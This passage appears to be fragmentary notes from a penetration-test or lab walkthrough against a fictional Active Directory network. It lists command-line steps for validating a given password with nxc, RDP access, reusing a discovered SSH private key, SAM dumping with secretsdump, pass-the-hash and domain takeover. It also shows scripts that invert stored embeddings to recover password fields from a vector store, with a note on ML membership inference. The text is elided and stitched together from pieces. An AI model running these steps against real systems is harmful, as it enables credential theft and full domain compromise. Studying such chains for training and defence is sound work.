...
python3 chunk_triage_pipe.py export/embeddings.npy --company example-corp
...
python3 emb_fin.py embeddings.npy --chunk 0 \
  ...
  --slots PASSWORD \
  --default-URL https://login.example.internal \
...
- `192.168.X.13` — dc-host, Windows Server / Active Directory, domain: `researchmco.ai`
- `192.168.X.14` — SRV1, Windows Server, Research Aggregator Portal (8080), Qdrant (6333/6334)

**Starting credential:** `svc-ts:Password1` (given at engagement start)

**Step-by-step:**

1. **Validate creds on SRV1**
   ```bash
   nxc smb 192.168.X.14 -u svc-ts -p Password1
   # Output: Pwn3d! — full SMB access
   ```

2. **RDP to SRV1 (NLA disabled)**
   ```bash
   xfreerdp /v:192.168.X.14 /u:svc-ts /p:Password1 /d:researchmco.ai \
...
4. **SSH to Ubuntu via SRV1 id_rsa key**
   ```bash
   # Found: C:\Users\Administrator\.ssh\id_rsa (svc-ts key)
   # Copy to Kali, then:
   ssh -i id_rsa svc-ts@192.168.X.12
   ```
...
9. **Domain takeover from SRV1**
   ...
   # Pass-the-hash to dc-host
   secretsdump.py RESEARCHMCO.AI/Administrator@dc-host \
...
Parallel: SAM dump → Pass-the-Hash to dc-host → Domain compromise
```
...
**Engagement note:** AML.T0024 is the parent; AML.T0024.000 is the membership-inference sub-technique. Both apply when you enumerate a vector store and attempt to determine what documents were indexed (membership) or recover the text (exfiltration via inference).
